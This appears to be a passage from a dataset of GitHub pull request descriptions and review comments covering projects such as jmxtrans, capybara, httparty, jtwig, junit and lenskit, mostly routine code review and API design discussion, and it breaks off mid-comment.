<a href='#crh-start'></a><a href='#crh-data-%7B%22processed%22%3A%20%5B%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23issuecomment-107332031%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23issuecomment-107678333%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23discussion_r31403460%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23discussion_r31403569%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23discussion_r31403607%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23discussion_r31460670%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23discussion_r31460672%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23discussion_r31460673%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23issuecomment-107680750%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23issuecomment-107681053%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23issuecomment-107682098%22%2C%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23issuecomment-107682576%22%5D%2C%20%22comments%22%3A%20%7B%22General%20Comment%22%3A%20%7B%22html_url%22%3A%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23issuecomment-107332031%22%2C%20%22comments%22%3A%20%5B%7B%22body%22%3A%20%22Thanks%20a%20lo%20for%20the%20help%20%21%20That%20something%20I%20wanted%20to%20clean%20up.%20I%27ll%20have%20a%20closer%20look%20this%20evening.%22%2C%20%22created_at%22%3A%20%222015-06-01T07%3A06%3A02Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/1415765%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/gehel%22%7D%7D%2C%20%7B%22body%22%3A%20%22%3A%2B1%3A%3Ca%20href%3D%27%23crh-update-none%27%3E%3C/a%3E%22%2C%20%22created_at%22%3A%20%222015-06-01T19%3A28%3A04Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/3947391%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/ivan-gusev%22%7D%7D%2C%20%7B%22body%22%3A%20%22Just%20a%20side%20note%20for%20next%20time%3A%20rebasing%20or%20squashing%20should%20probably%20be%20done%20at%20the%20end%20of%20code%20review%2C%20so%20that%20we%20can%20keep%20track%20of%20the%20discussion.%20Here%2C%20we%20have%20lost%20some%20of%20the%20context%20of%20the%20comments.%22%2C%20%22created_at%22%3A%20%222015-06-01T19%3A40%3A04Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/1415765%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/gehel%22%7D%7D%2C%20%7B%22body%22%3A%20%22I%27m%20going%20to%20take%20this%20opportunity%20to%20do%20some%20additional%20clean%20up%20of%20the%20tests%20...%20and%20merge%20all%20this%20...%22%2C%20%22created_at%22%3A%20%222015-06-01T19%3A41%3A41Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/1415765%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/gehel%22%7D%7D%2C%20%7B%22body%22%3A%20%22Sorry%20about%20rebasing.%20I%27m%20not%20a%20frequent%20contributor%20on%20github%20so%20might%20be%20missing%20on%20some%20best%20practices.%22%2C%20%22created_at%22%3A%20%222015-06-01T19%3A44%3A30Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/3947391%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/ivan-gusev%22%7D%7D%2C%20%7B%22body%22%3A%20%22No%20problem%21%20And%20each%20project%20has%20its%20own%20rules%20/%20preferences%2C%20so%20it%20is%20hard%20to%20find%20your%20way%20...%22%2C%20%22created_at%22%3A%20%222015-06-01T19%3A45%3A35Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/1415765%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/gehel%22%7D%7D%5D%2C%20%22title%22%3A%20%22General%20Comment%22%7D%2C%20%22Pull%20e98b27e72b952dec651cf853c837387adf2bed47%20jmxtrans-output/jmxtrans-output-core/src/test/java/com/googlecode/jmxtrans/model/output/OpenTSDBWriterTests.java%2039%22%3A%20%7B%22html_url%22%3A%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23discussion_r31403569%22%2C%20%22comments%22%3A%20%5B%7B%22body%22%3A%20%22Now%20that%20the%20pool%20is%20injected%20into%20%60OpenTSDBWriter%60%20we%20could%20probably%20remove%20the%20use%20of%20PowerMock.%20While%20it%20is%20not%20directly%20related%20to%20your%20change%2C%20this%20additional%20improvement%20would%20be%20very%20welcomed%20%21%22%2C%20%22created_at%22%3A%20%222015-06-01T07%3A02%3A37Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/1415765%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/gehel%22%7D%7D%2C%20%7B%22body%22%3A%20%22%3A%2B1%3A%3Ca%20href%3D%27%23crh-update-none%27%3E%3C/a%3E%22%2C%20%22created_at%22%3A%20%222015-06-01T19%3A28%3A05Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/3947391%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/ivan-gusev%22%7D%7D%5D%2C%20%22title%22%3A%20%22File%3A%20jmxtrans-output/jmxtrans-output-core/src/test/java/com/googlecode/jmxtrans/model/output/OpenTSDBWriterTests.java%3AL2-39%22%7D%2C%20%22Pull%20e98b27e72b952dec651cf853c837387adf2bed47%20jmxtrans-output/jmxtrans-output-core/src/main/java/com/googlecode/jmxtrans/model/output/TCollectorUDPWriter.java%2027%22%3A%20%7B%22html_url%22%3A%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23discussion_r31403460%22%2C%20%22comments%22%3A%20%5B%7B%22body%22%3A%20%22That%20should%20probably%20be%20a%20logger%20call%20and%20not%20a%20call%20to%20%60System.out%60.%22%2C%20%22created_at%22%3A%20%222015-06-01T06%3A59%3A31Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/1415765%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/gehel%22%7D%7D%2C%20%7B%22body%22%3A%20%22%3A%2B1%3A%3Ca%20href%3D%27%23crh-update-none%27%3E%3C/a%3E%22%2C%20%22created_at%22%3A%20%222015-06-01T19%3A28%3A05Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/3947391%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/ivan-gusev%22%7D%7D%5D%2C%20%22title%22%3A%20%22File%3A%20jmxtrans-output/jmxtrans-output-core/src/main/java/com/googlecode/jmxtrans/model/output/TCollectorUDPWriter.java%3AL60-85%22%7D%2C%20%22Pull%20e98b27e72b952dec651cf853c837387adf2bed47%20jmxtrans-output/jmxtrans-output-core/src/test/java/com/googlecode/jmxtrans/model/output/OpenTSDBWriterTests.java%20266%22%3A%20%7B%22html_url%22%3A%20%22https%3A//github.com/jmxtrans/jmxtrans/pull/300%23discussion_r31403607%22%2C%20%22comments%22%3A%20%5B%7B%22body%22%3A%20%22Static%20import%20of%20%60Assertions.assertThat%28%29%60%20would%20be%20more%20readable%20%28if%20there%20is%20no%20conflict%20with%20another%20assertion%20framework%29.%22%2C%20%22created_at%22%3A%20%222015-06-01T07%3A03%3A39Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/1415765%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/gehel%22%7D%7D%2C%20%7B%22body%22%3A%20%22%3A%2B1%3A%3Ca%20href%3D%27%23crh-update-complete%27%3E%3C/a%3E%22%2C%20%22created_at%22%3A%20%222015-06-01T19%3A28%3A05Z%22%2C%20%22user%22%3A%20%7B%22avatar_url%22%3A%20%22https%3A//avatars.githubusercontent.com/u/3947391%3Fv%3D3%22%2C%20%22html_url%22%3A%20%22https%3A//github.com/ivan-gusev%22%7D%7D%5D%2C%20%22title%22%3A%20%22File%3A%20jmxtrans-output/jmxtrans-output-core/src/test/java/com/googlecode/jmxtrans/model/output/OpenTSDBWriterTests.java%3AL96-185%22%7D%7D%7D'></a>
<a href='https://www.codereviewhub.com/'><img src='http://www.codereviewhub.com/site/github-bar.png' height=40></a>
- [ ] <a href='#crh-comment-General Comment'></a> <img src='http://www.codereviewhub.com/site/github-remaining.png' height=16 width=60>&nbsp;<b><a href='https://github.com/jmxtrans/jmxtrans/pull/300#issuecomment-107332031'>General Comment</a></b>
- <a href='https://github.com/gehel'><img border=0 src='https://avatars.githubusercontent.com/u/1415765?v=3' height=16 width=16'></a> Thanks a lo for the help ! That something I wanted to clean up. I'll have a closer look this evening.
- <a href='https://github.com/ivan-gusev'><img border=0 src='https://avatars.githubusercontent.com/u/3947391?v=3' height=16 width=16'></a> :+1:<a href='#crh-update-none'></a>
- <a href='https://github.com/gehel'><img border=0 src='https://avatars.githubusercontent.com/u/1415765?v=3' height=16 width=16'></a> Just a side note for next time: rebasing or squashing should probably be done at the end of code review, so that we can keep track of the discussion. Here, we have lost some of the context of the comments.
- <a href='https://github.com/gehel'><img border=0 src='https://avatars.githubusercontent.com/u/1415765?v=3' height=16 width=16'></a> I'm going to take this opportunity to do some additional clean up of the tests ... and merge all this ...
- <a href='https://github.com/ivan-gusev'><img border=0 src='https://avatars.githubusercontent.com/u/3947391?v=3' height=16 width=16'></a> Sorry about rebasing. I'm not a frequent contributor on github so might be missing on some best practices.
- <a href='https://github.com/gehel'><img border=0 src='https://avatars.githubusercontent.com/u/1415765?v=3' height=16 width=16'></a> No problem! And each project has its own rules / preferences, so it is hard to find your way ...
- [x] <a href='#crh-comment-Pull e98b27e72b952dec651cf853c837387adf2bed47 jmxtrans-output/jmxtrans-output-core/src/main/java/com/googlecode/jmxtrans/model/output/TCollectorUDPWriter.java 27'></a> <img src='http://www.codereviewhub.com/site/github-completed.png' height=16 width=60>&nbsp;<b><a href='https://github.com/jmxtrans/jmxtrans/pull/300#discussion_r31403460'>File: jmxtrans-output/jmxtrans-output-core/src/main/java/com/googlecode/jmxtrans/model/output/TCollectorUDPWriter.java:L60-85</a></b>
- <a href='https://github.com/gehel'><img border=0 src='https://avatars.githubusercontent.com/u/1415765?v=3' height=16 width=16'></a> That should probably be a logger call and not a call to `System.out`.
- [x] <a href='#crh-comment-Pull e98b27e72b952dec651cf853c837387adf2bed47 jmxtrans-output/jmxtrans-output-core/src/test/java/com/googlecode/jmxtrans/model/output/OpenTSDBWriterTests.java 39'></a> <img src='http://www.codereviewhub.com/site/github-completed.png' height=16 width=60>&nbsp;<b><a href='https://github.com/jmxtrans/jmxtrans/pull/300#discussion_r31403569'>File: jmxtrans-output/jmxtrans-output-core/src/test/java/com/googlecode/jmxtrans/model/output/OpenTSDBWriterTests.java:L2-39</a></b>
- <a href='https://github.com/gehel'><img border=0 src='https://avatars.githubusercontent.com/u/1415765?v=3' height=16 width=16'></a> Now that the pool is injected into `OpenTSDBWriter` we could probably remove the use of PowerMock. While it is not directly related to your change, this additional improvement would be very welcomed !
- [x] <a href='#crh-comment-Pull e98b27e72b952dec651cf853c837387adf2bed47 jmxtrans-output/jmxtrans-output-core/src/test/java/com/googlecode/jmxtrans/model/output/OpenTSDBWriterTests.java 266'></a> <img src='http://www.codereviewhub.com/site/github-completed.png' height=16 width=60>&nbsp;<b><a href='https://github.com/jmxtrans/jmxtrans/pull/300#discussion_r31403607'>File: jmxtrans-output/jmxtrans-output-core/src/test/java/com/googlecode/jmxtrans/model/output/OpenTSDBWriterTests.java:L96-185</a></b>
- <a href='https://github.com/gehel'><img border=0 src='https://avatars.githubusercontent.com/u/1415765?v=3' height=16 width=16'></a> Static import of `Assertions.assertThat()` would be more readable (if there is no conflict with another assertion framework).


<a href='https://www.codereviewhub.com/jmxtrans/jmxtrans/pull/300?mark_as_completed=1'><img src='http://www.codereviewhub.com/site/github-mark-as-completed.png' height=26></a>&nbsp;<a href='https://www.codereviewhub.com/jmxtrans/jmxtrans/pull/300?approve=1'><img src='http://www.codereviewhub.com/site/github-approve.png' height=26></a>&nbsp;<a href='https://github.com/jmxtrans/jmxtrans/pull/300'><img src='http://www.codereviewhub.com/site/github-refresh.png' height=26></a>
<a href='#crh-end'></a>","[""Thanks a lo for the help ! That something I wanted to clean up. I'll have a closer look this evening."", "":+1:<a href='#crh-update-none'></a>"", 'Just a side note for next time: rebasing or squashing should probably be done at the end of code review, so that we can keep track of the discussion. Here, we have lost some of the context of the comments.', ""I'm going to take this opportunity to do some additional clean up of the tests ... and merge all this ..."", ""Sorry about rebasing. I'm not a frequent contributor on github so might be missing on some best practices."", 'No problem! And each project has its own rules / preferences, so it is hard to find your way ...']"
304,jnicklas/capybara,1339.0,Fixes #1336 ,['thanks']
305,jnicklas/capybara,1506.0,"This adds Capybara.first_default_waiting as a setting to allow making the default behavior of Node#first be to wait for at least one element to match (same as passing minimum: 1 as an option), but returning nil if no matching elements show up rather than raising Capybara::ExpectationNotMet",['Thanks for this PR! This would indeed resolve my issues (apart from the raised questions around returning `nil`).']
306,jnicklas/capybara,1513.0,"Adds regex support when searching for links with `href` filters.

Solves #1510.","['@YSavir Other than the few line comments I made, its looking good -- please also update the has_link and click_link documentation to show they can take a regex for :href', 'Added changes. Should I squash the commits?', 'Once the documentation fixes are made, yes please squash', 'Done and done.', 'Thanks']"
307,jnunemaker/httparty,402.0,"This option allows you to roll out fancier URI implementations like the one
offered by the Addressable gem.

Addressable is a replacement for the URI implementation that is part of
Ruby's standard library. It more closely conforms to RFC 3986, RFC 3987,
and RFC 6570 (level 4), additionally providing support for IRIs and URI
templates. http://addressable.rubyforge.org/

*Sample Usage:*

```javascript
require 'httparty'
require 'addressable/uri'
require 'pp'

class Foo
  include HTTParty
  uri_adapter Addressable::URI
end

pp Foo.get('http://svd_identity.spinninpodcasts.com/rss')
```

Fixes #394 ","['All good to go on this?', 'Yep!, Looks good to me!']"
308,jtwig/jtwig,263.0,"Some highlights:

* `RenderConfiguration`, `CompileConfiguration`, and `ParseConfiguration` have been combined into the `Environment`
* The various `Resource` implementations (`StringJtwigResource`, et al) have been refactored into a set of `Loader`s and `Resource`s. The `Environment` is now solely responsible for managing the resolution and loading of resource. Multiple loaders may be specified through the use of the `ChainLoader`. As a result, the resolution process should always return a path relative to an arbitrary resource root, in much the same way as we specify a resource as 'client/list.twig' and whatnot.
* Concurrent rendering demonstrated a hang when the output stream wasn't specified. This is resolved with an exception noting the problem. Helpful in unit tests
* Unit tests have been widely refactored for uniformity, in addition to the refactoring required due to all my other changes.
* Template caching is now supported. At minimum a per-execution cache is required due to the new resolution and loading process, but the cache can be cleared after execution. In my local tests, render time drops considerably on the second run. I've seen a drop in one of my projects from ~1200ms to ~25ms after a second run. TODO: Auto-clear the ExecutionCache after rendering has completed.
* With the existence of the `Template` and its implementations, we now have a place to store per-template information, present examples being `Macro` and `Block` information, for later usage. This also allows us to use the SetVariable tag during template extension.","['\n[![Coverage Status](https://coveralls.io/builds/1673951/badge)](https://coveralls.io/builds/1673951)\n\nCoverage decreased (-3.13%) when pulling **5836ae7cb17d1774c188c7352086361f76eff2ec on thomas-p-wilson:refactor-template-model** into **9ccf625352478caa1d2559ae2f0ed2acfa90abce on jtwig:master**.\n', 'We need more tests on this! @thomas-p-wilson I can help you on this, just let me know what you need.', 'Is there a chance to get some of the improvements also into the 3.x branch? Especially the caching improvements?', ""@thomashunziker The caching changes are a pretty big departure from the way the 3.x branch works, but I'm more than happy to look into something that would remain backward compatible."", ""@lyncodev Thanks for the offer! I'll take you up on that! I've got some minor changes coming tomorrow for caching and resource resolution, after which I'll be catching up on tests. I'll update here as I begin writing tests so that we don't write tests for the same things, sound good?"", '@thomas-p-wilson sounds like a plan to me.', '@thomas-p-wilson I try to be around slack if you wanna have a quick chat around the testing.', '\n[![Coverage Status](https://coveralls.io/builds/1904445/badge)](https://coveralls.io/builds/1904445)\n\nCoverage decreased (-1.82%) to 92.19% when pulling **de3309c0ffd330901946def0efbecc1f65978877 on thomas-p-wilson:refactor-template-model** into **9ccf625352478caa1d2559ae2f0ed2acfa90abce on jtwig:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1907240/badge)](https://coveralls.io/builds/1907240)\n\nCoverage decreased (-1.01%) to 93.0% when pulling **cd351f2753d9aab8a18acd0e3e5c63ca8f40dcae on thomas-p-wilson:refactor-template-model** into **9ccf625352478caa1d2559ae2f0ed2acfa90abce on jtwig:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1907890/badge)](https://coveralls.io/builds/1907890)\n\nCoverage decreased (-0.49%) to 93.51% when pulling **65932621cbe876ba35d82d99cff8587d92f4ea26 on thomas-p-wilson:refactor-template-model** into **9ccf625352478caa1d2559ae2f0ed2acfa90abce on jtwig:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1908907/badge)](https://coveralls.io/builds/1908907)\n\nCoverage increased (+0.12%) to 94.13% when pulling **77b67e41fef544033b215c4d8df1d7b2a692a0a6 on thomas-p-wilson:refactor-template-model** into **9ccf625352478caa1d2559ae2f0ed2acfa90abce on jtwig:master**.\n', 'Nice one @thomas-p-wilson. Shall I merge it? So that we can start working on new shiny features?', 'I\'d say go for it. I/we can fix up any issues that arise as they come up.\nOn Feb 11, 2015 5:02 PM, ""Jo\xc3\xa3o Melo"" <notifications@github.com> wrote:\n\n> Nice one @thomas-p-wilson <https://github.com/thomas-p-wilson>. Shall I\n> merge it? So that we can start working on new shiny features?\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/jtwig/jtwig/pull/263#issuecomment-73974437>.\n>\n']"
309,junit-team/junit,981.0,"Create a Builder for FailOnTimeout.
Delete all constructors created since 4.11 was released.
","['@junit-team/junit-committers are you guys fine including this in 4.12? It replaces APIs added in 4.12', 'Dig it.  Full speed ahead.', 'LGTM now, too!', ""I'll merge this tonight or tomorrow if I don't hear any objections.""]"
310,junit-team/junit,1015.0,"Have made following changes that resolves #589 
 - Added to the list of `MethodRule`s declared as fields, rules returned from rule provider methods which solves the issue
 - Added relevant test cases incorporating the change
 - Change in `TestClass#getAnnotatedMethodValues` method because previously while scanning for methods returning a rule of particular type method invocation was done and then the type was evaluated based on returned value. But this behavior created a side effect and failed a test when I incorporated behavior to resolve the issue. The case `TestRuleTest#testCallMethodOnlyOnceRule` failed because `TestClass#getAnnotatedMethodValues` was called twice to scan for `@TestRule` and `@MethodRule` annotations and that called method rule provider method twice. To solve that change is incorporated in `TestClass#getAnnotatedMethodValues`","['Thanks for the fix!', '@kcooney Cheers man, I am a longtime user and now contributing. More contributions to come for sure. I have incorporated suggested changes.', 'Fantastic! Thanks for the changes. One very minor issue with the Javadoc. Once you fix that, would you please squash your commits to one commit? See https://github.com/junit-team/junit/wiki/Pull-Requests', '@kcooney I have squashed the commits including the change in javadoc. Thanks for your review and support.', 'LGTM\r\n\r\n@junit-team/junit-committers do we want to include this in 4.12 or a bug-fix release?', ""I'm in favor of including it into 4.12."", '+1']"
311,kei-s/github-preview,24.0,"This conversion is done by Transpec 2.3.6 with the following command:
    transpec

* 9 conversions
    from: obj.should
      to: expect(obj).to

* 6 conversions
    from: == expected
      to: eq(expected)

* 2 conversions
    from: obj.should_not
      to: expect(obj).not_to

For more details: https://github.com/yujinakayama/transpec#supported-conversions",[]
312,kevinsawicki/http-request,90.0,,"['I brought the codestyle in line with your proposals, please review.', 'Thanks for making the updates, would you mind adding section about this functionality to the `README.md`?', '@kevinsawicki done!', '@kevinsawicki Any update on this?', 'Sorry for the delay, will merge and release soon, thanks for the nudge.', 'Thanks for adding this.', 'This has been released in 6.0', 'Nice!']"
313,layervault/psd.rb,72.0,"Today I tesetd exporting a PSD that was in CMYK mode, and I got an x-ray like image.
So I tested example-cmyk.psd, and got similar result.

![example-cmyk-thumbnail](https://cloud.githubusercontent.com/assets/369170/3475031/9c2c2b7e-02eb-11e4-92ca-5937b0ee4ec5.png)

Below is export after converting PSD to RGB mode.

![example-rgb-thumbnail](https://cloud.githubusercontent.com/assets/369170/3475038/aa197d72-02eb-11e4-8138-3a0e2e65fcf8.png)

Is this a bug?

Environment: OS X 10.9, Ruby 2.0.0 (using rvm), gem version psd(3.2.2), psd_native(1.1.2)","['Yep, looks like a bug with the color conversion. Also looks like it happens without psd_native.', 'Did some digging. From https://github.com/layervault/psd.rb/blob/master/lib/psd/image_modes/cmyk.rb, val seems to be always 254 for alpha. (still testing with example psd from above).\r\n\r\nI also found this commit https://github.com/layervault/psd.rb/commit/3a16f8693e48abd417ae1d9e3efea199426b4540 where alpha is 255, and exported image seems correct.', 'So the problem is that the channel IDs are hard-coded for the full preview image. Fix incoming...']"
314,leereilly/swot,584.0,please help us to add student.lautech.edu.ng to the swot domain for universities. Example of the mail is osojo@student.lautech.edu.ng...,"[""Can you move the file to `lib/domains/edu/ng/lautech/student.txt`? Also, the file contents should be `Ladoke Akintola University of Technology`, without the part in parentheses. Add a comment here when that's done. Thanks!"", 'i have created the new folders....']"
315,lenskit/lenskit,733.0,"This works on #727.

We are not ready to merge this - it is just interfaces. However, I would like to think about interfaces before taking the time to implement.

The idea here is that (almost) all recommendation operations return a *result set*: a (possibly ordered) map of item (or user, for finding related users) IDs to values. Individual algorithms can extend the result set to provide additional details (see [DetailedResults](//github.com/lenskit/lenskit/wiki/DetailedResults)).

For recommendation, the result set will be ordered in decreasing order of score.

This subsumes both `SparseVector` and `List<ScoredId>` for recommendation and prediction results.","['One additional point of this design: if we adopt something like this, then we can make `lenskit-api` free of both `SparseVector` and fastutil.', 'Some review questions:\r\n\r\n- do we like this design direction?\r\n- do we want to extend `Map<Long,Double>`, or provide our own (simpler, read-only) interface with the ability to wrap it in a Map-compatible view? Upon further reflection, I think this would probably be good - result sets do not need to be modifiable.', ""@kluver Thanks. I've pushed up a few changes to implement `ResultList`/`ResultMap`, based on my understanding of current state of mailing list discussion."", 'Its worth noting that Im not reading the documentation on this pass. That will probably want its own pass once we get the other details happy.', 'My biggest concerns are \r\n\r\n  1. do we want to offer functions that go to base types like List<Long> or Map<Long, Double> for people who want a more normal java experience?\r\n  2. We need to think carefully and probably have sample code around how to use type casting to get extra details.', '@kluver wrote:\r\n> do we want to offer functions that go to base types like List or Map for people who want a more normal java experience?\r\n\r\nIs the fact that `ResultList` extends `List` enough to achieve this?\r\n\r\n> We need to think carefully and probably have sample code around how to use type casting to get extra details.\r\n\r\nYes.\r\n\r\nThere are a couple of ways that we could go. What I was originally envisioning is that you would usually do something like this:\r\n\r\n```java\r\nItemItemScorer scorer = rec.get(ItemItemScorer.class);\r\nItemItemResultMap results = score.scoreWithDetails(user, items);\r\nfor (ItemItemResult result: results) {\r\n    System.out.format(""%d: %.3f (%d neighbors)\\n"", result.getId(), result.getScore(), result.getNeighborCount());\r\n}\r\n```\r\n\r\nWe could also go with an individual result casting strategy:\r\n\r\n```java\r\nItemItemScorer scorer = rec.get(ItemItemScorer.class);\r\nResultMap results = scorer.scoreWithDetails(user, items);\r\nfor (Result result: results) {\r\n    ItemItemResult iir = (ItemItemResult) result;\r\n    System.out.format(""%d: %.3f (%d neighbors)\\n"", iir.getId(), iir.getScore(), iir.getNeighborCount());\r\n}\r\n```\r\n\r\nNow, things get a little funny when we\'re dealing with more complicated components.\r\n\r\n```java\r\nFallbackItemScorer scorer = rec.get(FallbackItemScorer.class);\r\nResultMap results = scorer.scoreWithDetails(user, items);\r\nfor (Result result: results) {\r\n    // we can get score\r\n    result.getScore();\r\n    FallbackScorerResult fsr = (FallbackScorerResult) result;\r\n    // primary:\r\n    Result pr = fsr.getPrimaryResult();\r\n    // fallback:\r\n    Result fb = fsr.getFallbackResult();\r\n}\r\n```\r\n\r\nNow, we have a problem: we really want the details from the primary result, which is something like an `ItemItemResult`. In an ideal world, `FallbackItemScorer` would be parameterized in its primary and fallback scorers, and their result types, and would return a parameterized `FallbackScorerResult`. However, generic types and the dependency injector don\'t get along, so we have avoided making injectible components such as item scorers generic. But we will, for any sufficiently interesting result type, need to deal with casting individual results; if we don\'t have to for the top-level results, we will have to for nested results.\r\n\r\nTherefore, it seems to me that since we will often need to cast individual results (because most interesting configurations will use some kind of a wrapper, like a simple rating predictor or a top-n item recommender or a fallback item scorer), being able to achieve type safety by casting entire scorers or result maps/sets to simplify the 30% case of just looking at outermost results is not worth it.\r\n\r\nWe could introduce an \'intelligent\' casting API, `as`, that converts the result type and returns `null` when conversion fails:\r\n\r\n```java\r\nItemScorer scorer = rec.getItemScorer();\r\nResultMap results = scorer.scoreWithDetails(user, items);\r\nfor (Result result: results) {\r\n    ItemItemResult iir = result.as(ItemItemResult.class);\r\n    assert iir != null; // if this fails, then our item scorer is not item-item and we are bad\r\n    System.out.format(""%d: %.3f (%d neighbors)\\n"", iir.getId(), iir.getScore(), iir.getNeighborCount());\r\n}\r\n```\r\n\r\nFor most basic result types, such as item-item results, the `as` method would just check the class and, if it\'s a superclass of the result implementation type, return the result, otherwise return `null`.\r\n\r\nThis can get interesting for more complicated results. The `SimplePredictionResult`, which will contain the prediction and provide the underlying scorer\'s result as a detail, can return the underlying result if its type matches the `as` type:\r\n\r\n```java\r\npublic <R extends Result> R as(Class<R> type) {\r\n    if (type.isInstance(this)) {\r\n        return type.cast(this);\r\n    } else {\r\n        return rawScore.as(type);\r\n    }\r\n}\r\n```\r\n\r\nThe `TopNItemRecommender` can just use its underlying scorer\'s results as its result type, and they can be type-cast with `as`.\r\n\r\nThe fallback scorer can try itself, then its left, and then its right implementations. So if you have a `FallbackScorer` that has a primary of an item-item and a baseline of a personalized mean, you can still get the item-item details with the exact same code above - the `as(ItemItemResult.class)` call will basically be \'if this thing is an item-item result, find it.\'\r\n\r\nNow, if we go this route, there is room for things to get surprising if you have particularly complicated configurations (e.g. a hybrid of a few item-item recommenders). But I think there are a few mitigating factors:\r\n\r\n- If you are doing sophisticated things with results, at some point you do need to know how your recommender is structured, and be more careful. There is no avoiding that.\r\n- Each composite result type should have clearly-defined search behavior, that is designed to minimize surprise.\r\n- We could further help by having two casting methods: `as`, which just does flat casting, and `find` that does the recursive search for an appropriate result type.', ""part 1: markdown ate some text. lemme escape it right: `List<Long>` and `Map<Long>` yes the inheritance is good, Im just wondering if everyone will want to deal with the Result objects.\r\n\r\n(because your feedback on comment part 2 will take a while to read I won't get to it for a while.)"", '@kluver I agree with adding methods to view the results as such a list. I think I also like the idea of making them the return type for the non-detailed methods - with good design for the result type implementations, it could even improve efficiency for the common case.', 'I don\'t know that I like the `FallbackScorerResult` but I don\'t think thats the point. (Im more interested in a mix of types and forcing people to write more robust result processing code)\r\n\r\nI like the direct use with no casting when people want to hardcode implementations. We will have to make it clear and obvious how to do that (get is a strange and magic function to be sure). \r\n\r\nWe will definitely need to think through the type casting variants. the ""as"" function seems compelling. I might be temped to say lets design that out. I personally would say lets make it work with interfaces as well so that we could create ""equivalence classes"" (or somesuch nonsense) of meaningful outputs (all knn algorithms, for example, can provide neighborhood sizes). \r\n\r\nDoes `as` actually give us much over the java `isntanceof` keywords? because if it doesn\'t we should just example code using normal java type casting concepts.\r\n\r\nI like this. It looks like we can do it with pretty good leverage of standard java type stuff. See comment about the confusing type-thingy in the rec list.\r\n\r\nLets do this.', '@kluver wrote:\r\n> Does as actually give us much over the java isntanceof keywords? because if it doesn\'t we should just example code using normal java type casting concepts.\r\n\r\nIn the flat version, it gives us a little DRY. Instead of `instanceof` followed by a `cast`, both mentioning the same class, it lets us have a single mention followed by a null check.\r\n\r\nIn the recursive search version, it gives us, the full recursive search.\r\n\r\n> We will definitely need to think through the type casting variants. the ""as"" function seems compelling. I might be temped to say lets design that out. I personally would say lets make it work with interfaces as well so that we could create ""equivalence classes"" (or somesuch nonsense) of meaningful outputs (all knn algorithms, for example, can provide neighborhood sizes).\r\n\r\nWorking with interfaces should be pretty easy.\r\n\r\n> Lets do this.\r\n\r\nWill do. I think I can implement some simple compatibility wrappers so that we don\'t have to migrate all of the implementations in a single pull request - we\'ll see.', ""@kluver wrote:\r\n> I like the direct use with no casting when people want to hardcode implementations. We will have to make it clear and obvious how to do that (get is a strange and magic function to be sure). \r\n\r\nI'm working on designing out the exact classes, and so far this requirement is resulting in some rather cumbersome use of generics."", ""@mdekstrand wrote:\r\n> @kluver wrote:\r\n> > I like the direct use with no casting when people want to hardcode implementations. We will have to make it clear and obvious how to do that (get is a strange and magic function to be sure).\r\n>\r\n> I'm working on designing out the exact classes, and so far this requirement is resulting in some rather cumbersome use of generics.\r\n\r\nI think I have a design for this now. Each custom implementation type can provide its own method that returns a List<CustomResultType>. Since the caller will be getting a specific implementation type anyway, we don't need the method to be specified in a general interface.\r\n\r\nThe `as`/`find` methods can convert result types in other cases."", 'OK, this now has a complete pass at result set APIs and the new public APIs.', 'I have a small number of documentation writing-level comments. \r\n\r\nThe as/find functions (being separate) confuses me a little, and I expect will confuse others. I\'m worried we are overenginerring for very complex result types, which would be almost unsable anyways.\r\n\r\nThe ""withDetails"" as a member of the interface seems unnecessary to me (unless there is something noteworthy that is different in the Java)', 'I am not that deep into the internals. But would it not be easier to actually be more functional? I read some parts of your discussion and hat a look 